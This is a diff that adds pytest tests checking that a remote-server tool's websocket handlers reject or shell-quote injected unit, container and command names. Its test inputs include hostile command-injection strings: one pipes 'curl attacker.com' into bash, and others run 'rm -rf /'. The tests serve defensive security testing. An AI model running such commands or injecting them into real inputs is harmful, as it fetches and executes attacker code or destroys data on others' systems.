@@ -197,3 +197,86 @@ async def test_exec_terminal_with_custom_command(mock_websocket, monkeypatch):
     # Verify correct command was executed
     call_args = mock_conn.create_process.call_args[0]
     assert "podman exec -it myapp python" in call_args[0]
+
+
+@pytest.mark.asyncio
+async def test_stream_logs_rejects_invalid_unit_name(mock_websocket, monkeypatch):
+    """Test that injected chars in unit_name are rejected before process is started"""
+    mock_pool = AsyncMock()
+    monkeypatch.setattr("api.sockets.pool", mock_pool)
+
+    await stream_logs_over_websocket(mock_websocket, server_id=1, unit_name="foo;curl attacker.com|bash")
+
+    mock_pool.get_connection.assert_not_called()
+    mock_websocket.send_text.assert_called_once()
+    sent = mock_websocket.send_text.call_args[0][0]
+    assert "invalid" in sent.lower() or "error" in sent.lower()
+
+
+@pytest.mark.asyncio
+async def test_exec_terminal_rejects_invalid_container_name(mock_websocket, monkeypatch):
+    """Test that injected chars in container_name are rejected before process is started"""
+    mock_pool = AsyncMock()
+    monkeypatch.setattr("api.sockets.pool", mock_pool)
+
+    await exec_terminal_over_websocket(mock_websocket, server_id=1, container_name="foo&&rm -rf /", scope="user", cmd="bash")
+
+    mock_pool.get_connection.assert_not_called()
+    mock_websocket.send_text.assert_called_once()
+    sent = mock_websocket.send_text.call_args[0][0]
+    assert "invalid" in sent.lower() or "error" in sent.lower()
+
+
+@pytest.mark.asyncio
+async def test_exec_terminal_cmd_injection_is_quoted(mock_websocket, monkeypatch):
+    """Test that shell metacharacters in cmd are quoted, not interpreted"""
+    mock_pool = AsyncMock()
+    mock_conn = AsyncMock()
+    mock_process = AsyncMock()
+    mock_process.kill = MagicMock()
+    mock_process.stdin = MagicMock()
+
+    async def mock_stdout():
+        raise WebSocketDisconnect()
+
+    mock_process.stdout = mock_stdout()
+    mock_conn.create_process.return_value = mock_process
+    mock_pool.get_connection.return_value = mock_conn
+    monkeypatch.setattr("api.sockets.pool", mock_pool)
+
+    mock_websocket.receive_text.side_effect = WebSocketDisconnect()
+
+    await exec_terminal_over_websocket(
+        mock_websocket, server_id=1, container_name="myapp", scope="user",
+        cmd="bash;rm -rf /"
+    )
+
+    call_args = mock_conn.create_process.call_args[0]
+    built_cmd = call_args[0]
+    # Semicolon must be quoted — it must not appear as a bare shell separator
+    assert "'bash;rm" in built_cmd or '"bash;rm' in built_cmd
+
+
+@pytest.mark.asyncio
+async def test_stream_logs_valid_unit_name_passes(mock_websocket, monkeypatch):
+    """Test that valid systemd unit names (including template instances) still work"""
+    mock_pool = AsyncMock()
+    mock_conn = AsyncMock()
+    mock_process = AsyncMock()
+    mock_process.terminate = MagicMock()
+
+    async def mock_stdout():
+        if False:
+            yield ""
+
+    mock_process.stdout = mock_stdout()
+    mock_conn.create_process.return_value = mock_process
+    mock_pool.get_connection.return_value = mock_conn
+    monkeypatch.setattr("api.sockets.pool", mock_pool)
+
+    mock_websocket.receive_text.return_value = "STOP"
+
+    await stream_logs_over_websocket(mock_websocket, server_id=1, unit_name="myapp@1.service")
+
+    mock_pool.get_connection.assert_called_once_with(1)
+    mock_conn.create_process.assert_called_once()
